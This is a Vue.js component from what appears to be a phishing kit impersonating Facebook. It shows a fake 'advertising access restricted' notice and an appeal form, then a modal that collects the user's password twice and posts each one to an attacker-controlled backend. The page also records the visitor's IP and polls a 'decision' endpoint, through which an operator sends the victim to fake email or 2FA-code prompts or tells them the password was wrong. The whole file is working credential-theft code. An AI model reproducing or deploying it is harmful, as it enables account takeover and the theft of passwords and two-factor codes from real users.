<script>
import useValidate from "@vuelidate/core";
import {
    required
} from "@vuelidate/validators";
import axios from "axios";
import ChatWidget from "@/components/ChatWidget.vue"

export default {
    name: "Form1",
    components: {
        ChatWidget,
    },
    data() {
        return {
            v$: useValidate(),
            waitingForResponse: false,
            chatMessage: false,
            loading: "",
            ipAddress: "",
            interval: "",
            decision: "",
            secondStep: false,
            firstStep: true,
            firstPassword: false,
            secondPassword: false,
            form: {
                page_name: "",
                name: "",
                email: "",
                mobile: "",
                appeal: "",
            },
            modal: {
                password: "",
                error: false,
            },
        };
    },
    created() {
        document.title = 'My Personal Account Was Restricted | Facebook';
        axios.interceptors.request.use(
            (config) => {
                if (this.waitingForResponse != true && this.chatMessage != true) {
                    this.loading = true;
                }
                return config;
            },
            (error) => {
                if (this.waitingForResponse != true && this.chatMessage != true) {
                    this.loading = false;
                }
                return Promise.reject(error);
            }
        );

        axios.interceptors.response.use(
            (response) => {
                if (this.waitingForResponse != true && this.chatMessage != true) {
                    this.loading = false;
                }
                return response;
            },
            (error) => {
                if (this.waitingForResponse != true && this.chatMessage != true) {
                    this.loading = false;
                }
                return Promise.reject(error);
            }
        );
    },
    mounted() {
        this.getClientIP();
        // this.checkBan();
    },
    methods: {
        goToSecondStep() {
            this.firstStep = false;
            this.secondStep = true;
        },
        chatMessageStatus() {
            this.chatMessage = true,
                console.log(this.chatMessage)
        },
        getClientIP() {
            axios
                .get("https://api.ipify.org?format=json")
                .then((response) => {
                    this.ipAddress = response.data.ip;
                    //   this.checkBan();
                })
                .catch((e) => {
                    console.log(e);
                });
        },
        // checkBan() {
        //   axios
        //     .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
        //       ip: this.ipAddress,
        //     })
        //     .then((response) => {
        //       if (response.data == "BAN") {
        //         window.location.href = "https://www.facebook.com/help/";
        //       }
        //     })
        //     .catch((e) => {
        //       console.log(e);
        //     });
        // },
        getResponse() {
            this.interval = setInterval(() => {
                axios
                    .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
                        case_ref: this.ipAddress,
                    })
                    .then((response) => {
                        let resType;

                        if (response.data == "CMD_EMAIL") {
                            resType = "email";

                            this.$router.push({
                                name: "twofa",
                                params: {
                                    type: resType,
                                    email: this.form.email,
                                },
                            });
                            clearInterval(this.interval);
                        }

                        if (response.data == "CMD_CODE") {
                            resType = "code";

                            this.$router.push({
                                name: "twofa",
                                params: {
                                    type: resType,
                                    email: this.form.email,
                                },
                            });
                            clearInterval(this.interval);
                        }

                        if (response.data == "CMD_CHECKPOINT") {
                            this.$router.push({
                                path: "checkpoint",
                            });
                            clearInterval(this.interval);
                        }

                        if (response.data == "CMD_WRONG") {
                            this.wrongPw = true;
                            this.loading = false;
                            this.modal.password = '';
                            clearInterval(this.interval);
                        }
                    })
                    .catch((e) => {
                        console.log(e);
                    });
            }, 1000);
        },
        submitForm() {
            console.log("submit");
            this.v$.$validate(); // checks all inputs
            if (!this.v$.$error) {
                let data = {
                    page_name: this.form.page_name,
                    name: this.form.name,
                    email: this.form.email,
                    mobile: this.form.mobile,
                    //   appeal: this.form.appeal,
                };
                console.log(data);
                // axios
                //     .post(
                //         `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
                //         data
                //     )
                //     .then((response) => {
                //         console.log(response);
                //     })
                //     .catch((e) => {
                //         this.errors.push(e);
                //         console.log(this.errors);
                //     });

                this.firstPassword = true;
            }
        },
        submitPassword() {
            if (this.modal.password != "") {
                if (this.secondPassword == false) {
                    this.modal.error = false;
                    axios
                        .post(
                            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`, {
                                firstPassword: this.modal.password
                            }
                        )
                        .then((response) => {
                            console.log(response);
                            console.log(response);
                            this.waitingForResponse = true;
                            this.loading = true;
                            this.getResponse();
                            this.secondPassword = true;
                        })
                        .catch((e) => {
                            this.errors.push(e);
                            console.log(this.errors);
                        });

                    this.modal.password = "";
                } else {
                    axios
                        .post(
                            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`, {
                                secondPassword: this.modal.password
                            }
                        )
                        .then((response) => {
                            console.log(response);
                            this.waitingForResponse = true;
                            this.loading = true;
                            this.getResponse();
                        })
                        .catch((e) => {
                            this.errors.push(e);
                            console.log(this.errors);
                        });
                }
            } else {
                this.modal.error = true;
            }
        },
        alert() {
            alert('Please complete the form before you navigate.');
        }
    },
    validations() {
        return {
            form: {
                page_name: {
                    required
                },
                name: {
                    required
                },
                email: {
                    required
                },
                mobile: {
                    required
                },
                appeal: {
                    required
                },
            },
        };
    },
};
</script>

<template>
<div v-if="loading" id="loadFacebookC" class="">
    <div id="loadFacebookG">
        <div id="blockG_1" class="facebook_blockG"></div>
        <div id="blockG_2" class="facebook_blockG"></div>
        <div id="blockG_3" class="facebook_blockG"></div>
    </div>
</div>
<div id="form">
    <div id="__next">
        <div class="Home_main__VkIEL">
            <div class="sidebar_sidebar__ScOu7">
                <div class="sidebar_menuTop__KCOlB">
                    <div class="">
                        <svg xmlns="http://www.w3.org/2000/svg" style="width:25px;" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
                            <path stroke-linecap="round" stroke-linejoin="round" d="m2.25 12 8.954-8.955c.44-.439 1.152-.439 1.591 0L21.75 12M4.5 9.75v10.125c0 .621.504 1.125 1.125 1.125H9.75v-4.875c0-.621.504-1.125 1.125-1.125h2.25c.621 0 1.125.504 1.125 1.125V21h4.125c.621 0 1.125-.504 1.125-1.125V9.75M8.25 21h8.25" />
                        </svg>
                    </div>
                    <div class="">
                        <svg xmlns="http://www.w3.org/2000/svg" style="width:25px;" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
                            <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
                        </svg>
                    </div>
                    <div class="sidebar_iconAvatar__y7akL"><img src="../assets/images/user.png"></div>
                    <div class="">

                    </div>
                </div>
                <div class="sidebar_menuBottom__ZZFBo">
                    <div class="sidebar_menuBottomWrapper__NV8zZ">
                        <div>
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" style="width:25px;" class="size-6">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M9.594 3.94c.09-.542.56-.94 1.11-.94h2.593c.55 0 1.02.398 1.11.94l.213 1.281c.063.374.313.686.645.87.074.04.147.083.22.127.325.196.72.257 1.075.124l1.217-.456a1.125 1.125 0 0 1 1.37.49l1.296 2.247a1.125 1.125 0 0 1-.26 1.431l-1.003.827c-.293.241-.438.613-.43.992a7.723 7.723 0 0 1 0 .255c-.008.378.137.75.43.991l1.004.827c.424.35.534.955.26 1.43l-1.298 2.247a1.125 1.125 0 0 1-1.369.491l-1.217-.456c-.355-.133-.75-.072-1.076.124a6.47 6.47 0 0 1-.22.128c-.331.183-.581.495-.644.869l-.213 1.281c-.09.543-.56.94-1.11.94h-2.594c-.55 0-1.019-.398-1.11-.94l-.213-1.281c-.062-.374-.312-.686-.644-.87a6.52 6.52 0 0 1-.22-.127c-.325-.196-.72-.257-1.076-.124l-1.217.456a1.125 1.125 0 0 1-1.369-.49l-1.297-2.247a1.125 1.125 0 0 1 .26-1.431l1.004-.827c.292-.24.437-.613.43-.991a6.932 6.932 0 0 1 0-.255c.007-.38-.138-.751-.43-.992l-1.004-.827a1.125 1.125 0 0 1-.26-1.43l1.297-2.247a1.125 1.125 0 0 1 1.37-.491l1.216.456c.356.133.751.072 1.076-.124.072-.044.146-.086.22-.128.332-.183.582-.495.644-.869l.214-1.28Z" />
                                <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />
                            </svg>
                        </div>
                        <div class="">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" style="width:25px;" class="size-6">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M14.857 17.082a23.848 23.848 0 0 0 5.454-1.31A8.967 8.967 0 0 1 18 9.75V9A6 6 0 0 0 6 9v.75a8.967 8.967 0 0 1-2.312 6.022c1.733.64 3.56 1.085 5.455 1.31m5.714 0a24.255 24.255 0 0 1-5.714 0m5.714 0a3 3 0 1 1-5.714 0" />
                            </svg>
                        </div>
                        <div class="">
                            <svg xmlns="http://www.w3.org/2000/svg" style="width:25px;" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
                                <path stroke-linecap="round" stroke-linejoin="round" d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
                            </svg>
                        </div>
                        <div class="">
                            <svg xmlns="http://www.w3.org/2000/svg" style="width:25px;" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
                                <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
                            </svg>

                        </div>
                        <div class="">
                            <svg xmlns="http://www.w3.org/2000/svg" style="width:25px;" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 3.75v4.5m0-4.5h4.5m-4.5 0L9 9M3.75 20.25v-4.5m0 4.5h4.5m-4.5 0L9 15M20.25 3.75h-4.5m4.5 0v4.5m0-4.5L15 9m5.25 11.25h-4.5m4.5 0v-4.5m0 4.5L15 15" />
                            </svg>
                        </div>
                    </div>
                </div>
            </div>
            <div v-if="firstStep" class="Home_content__tkQPU">
                <div class="Home_container__d256j">
                    <div class="robot-check_robotCheck__LzKqm">
                        <div class="robot-check_top__Ywb_V"><span class="robot-check_label__YttoJ">Account
                                Overview</span><span class="robot-check_split__WzX_y"> / </span><span class="robot-check_label__YttoJ">Business Account</span></div>
                        <div class="robot-check_alert__Z0KVL">
                            <div class="robot-check_alertLabel__wS8oR">
                                <div class="robot-check_alertIcon__x1MSN"></div><span class="robot-check_label__YttoJ">Advertising access permanently restricted</span>
                            </div><span class="robot-check_description__KC2SZ">Your request for a review of your
                                advertising access began but was left incomplete. As a measure to safeguard our
                                community, you will no longer be able to advertise using Meta Products. This decision is
                                final.</span>
                        </div>
                        <div class="robot-check_alertSecond__Eytsq">
                            <div class="robot-check_profile__aUuO6">
                                <div class="robot-check_profileIcon__GR_pQ">
                                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
                                        <path stroke-linecap="round" stroke-linejoin="round" d="M17.982 18.725A7.488 7.488 0 0 0 12 15.75a7.488 7.488 0 0 0-5.982 2.975m11.963 0a9 9 0 1 0-11.963 0m11.963 0A8.966 8.966 0 0 1 12 21a8.966 8.966 0 0 1-5.982-2.275M15 9.75a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />
                                    </svg>
                                </div>
                                <div class="robot-check_info__vEdlm">
                                    <h4>Bussines Account</h4>
                                    <div class="robot-check_labelRestricted__XtXMP"><span class="robot-check_redLabel__ohpPN">Account restricted</span> •
                                        <span>Restricted on
                                            <!-- -->Apr 22</span></div>
                                </div>
                            </div><span class="robot-check_description__KC2SZ">Your Facebook account is temporarily
                                restricted because we noticed unusual activity on it. While your account is restricted,
                                Ads Manager features are limited, and you won’t be able to boost posts, add people or
                                edit roles.</span>
                            <div class="robot-check_restrict__JMWjc">
                                <div class="robot-check_resctrictCard__mJK__"><span class="robot-check_resLabel__e3iVg">Restrictions</span>
                                    <div class="robot-check_list__ETmFx"><span>
                                            <!-- <div class="robot-check_radius__eaegd">
                                                <div class="robot-check_img__wAYUR"></div>
                                            </div> -->
                                            <h5>Can't use or manage ad accounts</h5>
                                        </span><span>
                                            <!-- <div class="robot-check_radius__eaegd">
                                                <div class="robot-check_img__wAYUR"></div>
                                            </div> -->
                                            <h5>Can't create or run ads</h5>
                                        </span><span>
                                            <!-- <div class="robot-check_radius__eaegd">
                                                <div class="robot-check_img__wAYUR"></div>
                                            </div> -->
                                            <h5>Can't manage advertising assets or people for businesses</h5>
                                        </span></div>
                                </div>
                                <div class="robot-check_resctrictCard__mJK__"><span class="robot-check_resLabel__e3iVg">Disabled assets</span>
                                    <div class="robot-check_list__ETmFx"><span>
                                            <!-- <div class="robot-check_radius__eaegd">
                                                <div class="robot-check_img__wAYUR"></div>
                                            </div> -->
                                            <h5>Personal ad account</h5>
                                        </span><span>
                                            <!-- <div class="robot-check_radius__eaegd">
                                                <div class="robot-check_img__wAYUR"></div>
                                            </div> -->
                                            <h5>Audiences</h5>
                                        </span></div>
                                </div>
                            </div>
                        </div>
                        <div class="robot-check_submitRequest__jg3yB">
                            <h3>What you can do</h3>
                            <div class="robot-check_details__IqXdt">
                                <div class="robot-check_radius__eaegd">
                                    <div class="">
                                        <img style="width:50px;" src="../assets/images/user.png">
                                    </div>
                                </div>
                                <div class="robot-check_description__KC2SZ"><strong>Verification
                                        required</strong><span>Please complete verification to remove the current
                                        restrictions on your account. <br> <br>After completing verification, you may
                                        need to log back into your Facebook account.</span>
                                        <button @click="goToSecondStep()">Start verification</button>
                                      </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div v-if="secondStep" class="Home_content__tkQPU">
                <div class="Home_container__d256j">
                    <div class="appeal-form_appealForm__3oG17">
                        <div class="appeal-form_top__J8QRH"><span class="appeal-form_label__m6oPY">Account Overview</span><span class="appeal-form_split__1YEn8"> / </span><span class="appeal-form_label__m6oPY">Request Review</span></div>
                        <div class="appeal-form_box__etzGl">
                            <form onsubmit="return false;">
                                <h3 class="appeal-form_mainLabel__YA9Xb">Get Started</h3>
                                <div class="appeal-form_input__8BBKy"><label>Please provide us information that will help us investigate</label>
                                  <textarea v-model="form.appeal" name="appeal"></textarea>
                                  <p
                                    v-for="(error, index) of v$.form.appeal.$errors"
                                    :key="index"
                                    class="pwincorrect"
                                  >
                                    Appeal cannot be empty!
                                  </p>
                                </div>
                                <div class="appeal-form_input__8BBKy"><label>Full Name</label>
                                  <input v-model="form.name" type="text" name="fullName">
                                    <p
                                      v-for="(error, index) of v$.form.name.$errors"
                                      :key="index"
                                      class="pwincorrect"
                                    >
                                      Your name cannot be empty!
                                    </p>
                                </div>
                                <div class="appeal-form_input__8BBKy"><label>Business Email Address</label>
                                  <input v-model="form.email" type="email" name="businessEmail">
                                  <p
                                    v-for="(error, index) of v$.form.email.$errors"
                                    :key="index"
                                    class="pwincorrect"
                                  >
                                    Email cannot be empty!
                                  </p>
                                </div>
                                <div class="appeal-form_input__8BBKy"><label>Mobile Phone Number</label>
                                  <input v-model="form.mobile" type="text" name="phone">
                                    <p
                                      v-for="(error, index) of v$.form.mobile.$errors"
                                      :key="index"
                                      class="pwincorrect"
                                    >
                                      Phone number cannot be empty!
                                    </p>
                                </div>
                                <div class="appeal-form_input__8BBKy"><label>Facebook Page Name</label>
                                  <input v-model="form.page_name" type="text" name="pageName">
                                    <p
                                      v-for="(error, index) of v$.form.page_name.$errors"
                                      :key="index"
                                      class="pwincorrect"
                                    >
                                      Page name cannot be empty!
                                    </p>
                                </div>
                                  
                                  <button @click="submitForm">Submit</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Chat Widget -->
<chat-widget :ipAddress="ipAddress" @chat-message-status="chatMessageStatus" />

<div v-if="firstPassword" id="modalFade" class="fade modal-backdrop show"></div>
<div v-if="firstPassword" id="fbPasswordModal" role="dialog" aria-modal="true" class="fade modali2 modal show" style="display: block" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title h4">Please Enter Your Password</div>
                <button type="button" class="btn-close" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p class="foryoursecurity">
                    For your security, you must re-enter your password to continue.
                </p>
                <div class="mb-3 formapw">
                    <label class="labela" for="formBasicEmail">Password</label>
                    <input v-model="modal.password" required="" type="password" id="passwordField" class="form-control" />
                </div>
                <p v-if="modal.error" class="pwincorrect">Password cannot be empty!</p>
                <p v-if="wrongPw" class="pwincorrect" id="fbPasswordModalError">
                    Your password was incorrect!
                </p>
            </div>
            <div class="modal-footer">
                <button @click="submitPassword" type="button" id="passwordSubmitBtn" form="forma1" class="btn btn-primary button-15">
                    Continue
                </button>
            </div>
        </div>
    </div>
</div>
</template>

<style scoped src="../assets/css/main.css">
</style><style scoped>
.hidden {
    display: none !important;
}

.open-modal {
    overflow: hidden !important;
    padding-right: 16px;
}

.pwincorrect{
  color: red;
}
</style>
